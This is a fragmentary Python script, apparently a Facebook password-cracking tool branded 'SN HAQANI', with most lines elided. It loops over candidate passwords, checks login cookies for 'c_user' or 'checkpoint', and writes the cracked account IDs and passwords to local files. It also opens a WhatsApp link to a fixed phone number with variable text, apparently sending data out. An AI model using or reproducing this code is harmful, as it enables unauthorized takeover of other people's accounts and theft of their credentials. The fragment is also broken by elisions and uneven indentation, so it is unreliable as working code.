...
for xd in range(10000):
	...
	os.system('am start http://wa.me/+93701659187?text=' + tks)
        ...
        for ps in pwx:
           ...
           'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[SN HAQANI-OK] '+cid+'|'+ps+'\033[0;97m')
                open('SN HAQANI-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[SN HAQANI-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('SN HAQANI-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
